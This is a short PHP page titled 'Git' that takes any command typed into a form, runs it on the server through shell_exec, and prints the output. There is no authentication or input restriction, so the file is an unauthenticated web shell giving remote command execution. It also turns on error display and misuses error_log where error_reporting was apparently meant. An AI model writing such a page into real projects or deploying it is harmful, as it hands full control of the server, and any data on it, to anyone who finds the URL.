<?php 
error_log(E_ALL);
ini_set('display_errors', '1');
?>

<html>
<head>
	<meta charset="utf-8" />
	<title>Git</title>
</head>

<body class="login-body">
	<div id="command-form">
		<form action="" method="post">
			<input type="text" id="command" name="command" value="" />
			<button id="execute" name="">Execute</button>
		</form>
	</div>
	<div id="command-result">
		<pre>
		<?php 
			if($_POST){
				$cmd = $_POST['command'].' 2>&1';
				echo shell_exec($cmd);
				//echo '<br>';
				//echo system($_POST['command']);
			}
		?>
		</pre>
	</div>
</body>
</html>